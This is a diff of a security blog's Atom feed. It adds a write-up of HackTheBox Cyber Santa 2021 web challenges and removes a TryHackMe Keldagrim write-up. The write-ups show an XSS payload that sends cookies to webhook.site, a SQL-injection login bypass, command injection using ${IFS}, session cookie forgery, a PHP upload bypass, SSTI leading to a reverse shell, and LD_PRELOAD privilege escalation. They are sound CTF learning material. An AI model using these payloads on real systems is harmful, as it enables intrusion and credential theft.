@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/tag/ctf/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2021-12-05T22:29:11+00:00</updated>
+  <updated>2021-12-06T08:09:24+00:00</updated>
   <id>https://darrynbrownfield.co.uk/tag/ctf/feed.xml</id>
 
   
@@ -30,6 +30,286 @@
   
   
 
+  
+    <entry>
+      <title type="html">HTB Cyber Santa CTF 2021 Web Write Up</title>
+      <link href="https://darrynbrownfield.co.uk/htbcybersanta" rel="alternate" type="text/html" title="HTB Cyber Santa CTF 2021 Web Write Up" />
+      <published>2021-12-05T00:00:00+00:00</published>
+      <updated>2021-12-05T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/htbcybersanta</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/htbcybersanta">&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;This writeup is for the web challenges from the &lt;a href=&quot;https://www.hackthebox.com&quot;&gt;HackTheBox&lt;/a&gt; Cyber Santa is Coming to Town CTF that took place from Wednesday 01 December to Sunday 05 December.&lt;/p&gt;
+
+&lt;p&gt;A big thank you to HTB for putting on a great event (as always). Check out their other CTF events at https://ctf.hackthebox.com.&lt;/p&gt;
+
+&lt;h3 id=&quot;toy-workshop&quot;&gt;Toy Workshop&lt;/h3&gt;
+
+&lt;p&gt;The description for this challenge was:&lt;/p&gt;
+
+&lt;p&gt;“The work is going well on Santa’s toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?”&lt;/p&gt;
+
+&lt;p&gt;The challenge had both a docker instance to active and downloadable content.&lt;/p&gt;
+
+&lt;p&gt;Taking a look at the docker instance IP we get a simple web page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/workshop.gif&quot; alt=&quot;workshop&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Rather than spend time poking around the website I took a look at the code provided.&lt;/p&gt;
+
+&lt;p&gt;In the routes/index.js file provides some additional paths, ‘/api/submit’ and ‘/queries’.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;router.get('/', (req, res) =&amp;gt; {
+	return res.render('index');
+});
+
+router.post('/api/submit', async (req, res) =&amp;gt; {
+
+		const { query } = req.body;
+		if(query){
+			return db.addQuery(query)
+				.then(() =&amp;gt; {
+					bot.readQueries(db);
+					res.send(response('Your message is delivered successfully!'));
+				});
+		}
+		return res.status(403).send(response('Please write your query first!'));
+});
+
+router.get('/queries', async (req, res, next) =&amp;gt; {
+	if(req.ip != '127.0.0.1') return res.redirect('/');
+
+	return db.getQueries()
+		.then(queries =&amp;gt; {
+			res.render('queries', { queries });
+		})
+		.catch(() =&amp;gt; res.status(500).send(response('Something went wrong!')));
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Two things jump out, the first the /api/submit page requires a POST request, if its accepted it will run ‘bot.readQueries(db);’. Next the /queries page is only accessible from 127.0.0.1.&lt;/p&gt;
+
+&lt;p&gt;Taking a look at views/bot.js, the flag will be provided as a cookie and the readQueries function when called will set a cookie and call the queries page.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;const cookies = [{
+	'name': 'flag',
+	'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'
+}];
+
+
+const readQueries = async (db) =&amp;gt; {
+		const browser = await puppeteer.launch(browser_options);
+		let context = await browser.createIncognitoBrowserContext();
+		let page = await context.newPage();
+		await page.goto('http://127.0.0.1:1337/');
+		await page.setCookie(...cookies);
+		await page.goto('http://127.0.0.1:1337/queries', {
+			waitUntil: 'networkidle2'
+		});
+		await browser.close();
+		await db.migrate();
+};
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next reviewing the views/queries.hbs page, It looks like the page iterates through the queries.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;        &amp;lt;p class=&quot;pb-3&quot;&amp;gt;Welcome back, admin!&amp;lt;/p&amp;gt;
+        &amp;lt;div class=&quot;dash-frame&quot;&amp;gt;
+            
+            &amp;lt;p&amp;gt;}&amp;lt;/p&amp;gt;
+            
+            &amp;lt;p class=&quot;empty&quot;&amp;gt;No content&amp;lt;/p&amp;gt;
+            
+        &amp;lt;/div&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So putting all this together I think we can use XSS to grab the cookie by sending a XSS payload in the API submit function. The cookie (flag) will be sent and the readQueries function will call the queries page, the XSS payload will fire and give our flag.&lt;/p&gt;
+
+&lt;p&gt;First I tested sending a simple POST request using curl and got a response.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $curl -X POST http://:/api/submit --header 'Content-Type: application/json' -d '{&quot;query&quot;:&quot;test&quot;}'
+{&quot;message&quot;:&quot;Your message is delivered successfully!&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I used https://webhook.site to generate a URL I could use in the XSS payload. I then changed the payload to use a script tag to call the web hook site along with the cookie.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $curl -X POST :/api/submit --header 'Content-Type: application/json' -d '{&quot;query&quot;:&quot;&amp;gt;&amp;lt;script&amp;gt;window.location='\''https://webho
+ok.site//?c='\''.concat(document.cookie)&amp;lt;/script&amp;gt;&quot;}'
+{&quot;message&quot;:&quot;Your message is delivered successfully!&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On the webhook site was my request and the cookie.&lt;/p&gt;
+
+&lt;h3 id=&quot;toy-management&quot;&gt;Toy Management&lt;/h3&gt;
+
+&lt;p&gt;The description for Toy Management was:&lt;/p&gt;
+
+&lt;p&gt;“The evil elves have changed the admin access to Santa’s Toy Management Portal. Can you get the access back and save the Christmas?”&lt;/p&gt;
+
+&lt;p&gt;Again with both a docker instance to start and downloadable content. This time its just a login form. I tried “admin’– -“ in the username field and “admin” as the password and got in and got the flag!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/toymanagement.png&quot; alt=&quot;toymanagement&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;gadget-santa&quot;&gt;Gadget Santa&lt;/h3&gt;
+
+&lt;p&gt;The description for Gadget Santa was:&lt;/p&gt;
+
+&lt;p&gt;“It seems that the evil elves have broken the controller gadget for the good old candy cane factory! Can you team up with the real red teamer Santa to hack back?”&lt;/p&gt;
+
+&lt;p&gt;Again this challenge had both a docker instance and downloadable content.&lt;/p&gt;
+
+&lt;p&gt;Looking at the webpage, I appears I can select options to print output from the system.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/gadgets.gif&quot; alt=&quot;gadgets&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The URL has a command parameter: http://:/?command=list_storage&lt;/p&gt;
+
+&lt;p&gt;So I tried some basic linux commands and I got output.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/commands.gif&quot; alt=&quot;commands&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, when ever I try and use a space I get no output. I can chain commands together using &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; but it still fails to show an output if I use a space.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/listfiles.gif&quot; alt=&quot;listfiles&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looking at the source, there is a sanitize function which removes spaces from the command.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;?php
+class MonitorModel
+{   
+    public function __construct($command)
+    {
+        $this-&amp;gt;command = $this-&amp;gt;sanitize($command);
+    }
+
+    public function sanitize($command)
+    {   
+        $command = preg_replace('/\s+/', '', $command);
+        return $command;
+    }
+
+    public function getOutput()
+    {
+        return shell_exec('/santa_mon.sh '.$this-&amp;gt;command);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In a Python script shows the placeholder for the flag. The script is a web server running locally on port 3000.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;def http_server(host_port,content_type=&quot;application/json&quot;):
+	class CustomHandler(SimpleHTTPRequestHandler):
+		def do_GET(self) -&amp;gt; None:
+			def resp_ok():
+				self.send_response(200)
+				self.send_header(&quot;Content-type&quot;, content_type)
+				self.end_headers()
+			if self.path == '/':
+				resp_ok()
+				if check_service():
+					self.wfile.write(get_json({'status': 'running'}))
+				else:
+					self.wfile.write(get_json({'status': 'not running'}))
+				return
+			elif self.path == '/restart':
+				restart_service()
+				resp_ok()
+				self.wfile.write(get_json({'status': 'service restarted successfully'}))
+				return
+			elif self.path == '/get_flag':
+				resp_ok()
+				self.wfile.write(get_json({'status': 'HTB{f4k3_fl4g_f0r_t3st1ng}'}))
+				return
+			self.send_error(404, '404 not found')
+		def log_message(self, format, *args):
+			pass
+	class _TCPServer(TCPServer):
+		allow_reuse_address = True
+	httpd = _TCPServer(host_port, CustomHandler)
+	httpd.serve_forever()
+
+http_server(('127.0.0.1',3000))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So I should be able to curl localhost:3000/get_flag to grab the flag. However I need to bypass the sanitization. To do this I can use &lt;code class=&quot;highlighter-rouge&quot;&gt;${IFS}&lt;/code&gt;. &lt;a href=&quot;https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions#bypass-forbidden-spaces&quot;&gt;HackTricks&lt;/a&gt; is a great resource for techniques like this.&lt;/p&gt;
+
+&lt;p&gt;So with the URL “http://:/?command=;curl${IFS}localhost:3000/get_flag” I get the flag!&lt;/p&gt;
+
+&lt;h3 id=&quot;elf-directory&quot;&gt;Elf Directory&lt;/h3&gt;
+
+&lt;p&gt;The description for Elf Directory was:&lt;/p&gt;
+
+&lt;p&gt;“Can you infiltrate the Elf Directory to get a foothold inside Santa’s data warehouse in the North Pole?”&lt;/p&gt;
+
+&lt;p&gt;There is no downloadable content for this challenge just a docker instance to start.&lt;/p&gt;
+
+&lt;p&gt;Going to the docker instance IP and port shows a login page, unfortunately no simple SQL bypass this time.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/elfdirectory.png&quot; alt=&quot;elfdirectory&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried some basic default credentials but had no luck so created an account with the username d4zs3c and logged in.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/loggedin.png&quot; alt=&quot;loggedin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is a message:&lt;/p&gt;
+
+&lt;p&gt;“You don’t have permission to edit your profile, contact the admin elf to approve your account!”&lt;/p&gt;
+
+&lt;p&gt;Now logged I checked the developer tools in Firefox and I have a PHPSESSID. I coped the cookie value and put it in &lt;a href=&quot;https://gchq.github.io&quot;&gt;CyberChef&lt;/a&gt; and used ‘From Base64’ operation.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/cookie.png&quot; alt=&quot;cookie&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I removed the %3D which left with me &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;username&quot;:&quot;d4zs3c&quot;,&quot;approved&quot;:false}&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Next I changed the input to &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;username&quot;:&quot;d4zs3c&quot;,&quot;approved&quot;:true}&lt;/code&gt; and used the ‘To Base64’. Using the developer tools I removed the value up until the %3d and pasted in my new base64 string which looked like: “eyJ1c2VybmFtZSI6ImQ0enMzYyIsImFwcHJvdmVkIjp0cnVlfQ==%3D”&lt;/p&gt;
+
+&lt;p&gt;Now refreshing the page with my new cookie I get the option to upload a file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/approved.png&quot; alt=&quot;approved&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried to upload a PHP file but got an error:&lt;/p&gt;
+
+&lt;p&gt;“Invalid image. Only PNG images are supported.”&lt;/p&gt;
+
+&lt;p&gt;So I downloaded an image of Santa (had to be) and tried to upload it but this time via Burp so I could modify it before its submitted. I appended the file name with .php and removed the contents of the file with a simple PHP script.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/uploadbypass.gif&quot; alt=&quot;uploadbypass&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now all I need to do is browse to the file and I will have command execution and can read the flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/commandinjection.gif&quot; alt=&quot;commandinjection&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="hackthebox" />
+      
+        <category term="ctf" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
   
     <entry>
       <title type="html">Road Write Up</title>
@@ -3081,181 +3361,6 @@ dailybugle
         <category term="hard" />
       
         <category term="oscp" />
-      
-
-      
-        <summary type="html"></summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">Keldagrim Write Up</title>
-      <link href="https://darrynbrownfield.co.uk/keldagrim" rel="alternate" type="text/html" title="Keldagrim Write Up" />
-      <published>2021-03-06T00:00:00+00:00</published>
-      <updated>2021-03-06T00:00:00+00:00</updated>
-      <id>https://darrynbrownfield.co.uk/keldagrim</id>
-      <content type="html" xml:base="https://darrynbrownfield.co.uk/keldagrim">&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/cover.png&quot; alt=&quot;keldagrim&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/keldagrim&quot;&gt;Keldagrim&lt;/a&gt; is a medium level CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://twitter.com/optionalctf&quot;&gt;Optional&lt;/a&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Can you overcome the forge and steal all of the gold!&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;I deployed the machine and was given the target IP 10.10.252.142 I started a nmap scan to check the available ports.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN nmap/initial 10.10.252.142
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-06 13:03 GMT
-Nmap scan report for 10.10.252.142
-Host is up (0.030s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 d8:23:24:3c:6e:3f:5b:b0:ec:42:e4:ce:71:2f:1e:52 (RSA)
-|   256 c6:75:e5:10:b4:0a:51:83:3e:55:b4:f6:03:b5:0b:7a (ECDSA)
-|_  256 4c:51:80:db:31:4c:6a:be:bf:9b:48:b5:d4:d6:ff:7c (ED25519)
-80/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
-| http-cookie-flags: 
-|   /: 
-|     session: 
-|_      httponly flag not set
-|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
-|_http-title:  Home page 
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Werkzeug httpd 1.0.1&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;I opened up my browser and started to have a look at the web page.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nothing really stood out however when I looked at the source code I could see a disabled link to /admin&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;    &amp;lt;li class=&quot;nav-item dropdown&quot;&amp;gt;
-        &amp;lt;a class=&quot;nav-link dropdown-toggle&quot; href=&quot;#&quot; id=&quot;navbarDropdown&quot; role=&quot;button&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&amp;gt;
-          Buy Gold
-        &amp;lt;/a&amp;gt;
-        &amp;lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;navbarDropdown&quot;&amp;gt;
-            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/wow&quot;&amp;gt;World of Warcraft&amp;lt;/a&amp;gt;
-            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/OSRunescape&quot;&amp;gt;Old School Runescape&amp;lt;/a&amp;gt;
-            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/runescape&quot;&amp;gt;Runescape3&amp;lt;/a&amp;gt;
-          &amp;lt;div class=&quot;dropdown-divider&quot;&amp;gt;&amp;lt;/div&amp;gt;
-          &amp;lt;a class=&quot;dropdown-item &quot; href=&quot;/admin&quot;&amp;gt;Admin&amp;lt;/a&amp;gt;
-        &amp;lt;/div&amp;gt;
-      &amp;lt;/li&amp;gt;
-&amp;lt;/ul&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;However the page looks pretty much the same. So I looked at cookies and found a session cooke with a base64 value.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/guest.png&quot; alt=&quot;guest&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;There are lots of ways to change the base64 to plaintext but I really like &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt; at the moment. Using CyberChef I was able to see the value was ‘guest’.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/cyberchef.png&quot; alt=&quot;cyberchef&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I used CyberChef again to encode ‘admin’ in to base64.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/adminhash.png&quot; alt=&quot;adminhash&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Simply changing the session cookie value to the base64 output and refreshing the page now allowed me to see - ‘Current user - $2,165’ and be provided with a sales cookie.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/sales.png&quot; alt=&quot;sales&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This was also base64 encoded, CyberChef has a great feature called ‘Magic’, if you are unsure how something is encoded use magic to suggest and test various operations.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/saleshash.png&quot; alt=&quot;saleshash&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This next bit took some time, I was able to base64 a string and input it in to the sales cookie and it would be displayed on the webpage, however I was unsure how I would be able to use this to get a foothold on the box. After some googling, I tried a technique called Server Side Template Injection (SSTI). This was not something I had tried to exploit before so I did some research on the technique to try and understand it and used &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection&quot;&gt;PayloadsAllTheThings&lt;/a&gt; to see if I was on the right track.&lt;/p&gt;
-
-&lt;p&gt;I found a payload {{7*'7’}} and if I had SSTI that should result in 7777777. I encoded the payload in base64 and updated the sales cookie with the output.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/sstipayload.png&quot; alt=&quot;sstipayload&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Refreshed the page and confirmed I had SSTI in the sales cookie!&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/ssti.png&quot; alt=&quot;ssti&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
-
-&lt;p&gt;On the same &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection&quot;&gt;PayloadsAllTheThings&lt;/a&gt; page was an example for remote code execution. I took the example for exploiting an SSTI by calling Popen without guessing the offset, changed the IP and port values and encoded again with base64.&lt;/p&gt;
-
-&lt;p&gt;I opened a nc listener and updated the sales cookie with the base64 output and got a shell!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
-listening on [any] 4444 ...
-connect to [10.8.21.217] from (UNKNOWN) [10.10.252.142] 36928
-/bin/sh: 0: can't access tty; job control turned off
-$ whoami
-jed
-$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
-&lt;p&gt;Now to get root i checked ‘sudo -l’.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -l
-Matching Defaults entries for jed on keldagrim:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
-
-User jed may run the following commands on keldagrim:
-    (ALL : ALL) NOPASSWD: /bin/ps
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I had a look at &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; for ‘/bin/ps’ but as expected I didn’t find anything, I also noticed ‘env_keep+=LD_PRELOAD’. There is a great course by &lt;a href=&quot;https://twitter.com/thecybermentor&quot;&gt;Heath Adams&lt;/a&gt; on &lt;a href=&quot;https://www.udemy.com/course/linux-privilege-escalation-for-beginners&quot;&gt;udemy&lt;/a&gt; for Linux privesc techinques and this is covered as part of the course. There is also a great &lt;a href=&quot;https://touhidshaikh.com/blog/2018/04/12/sudo-ld_preload-linux-privilege-escalation/&quot;&gt;article&lt;/a&gt; which covers it.&lt;/p&gt;
-
-&lt;p&gt;I used the steps in the article to create a file called evil.c, compiled with GCC. Ran the sudo command with LD_PRELOAD and got root!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;jed@keldagrim:/dev/shm$ sudo LD_PRELOAD=/dev/shm/evil.so ps
-root@keldagrim:/dev/shm# id
-uid=0(root) gid=0(root) groups=0(root)
-root@keldagrim:/dev/shm# 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Darryn</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="tryhackme" />
-      
-        <category term="ctf" />
-      
-        <category term="medium" />
       
 
       
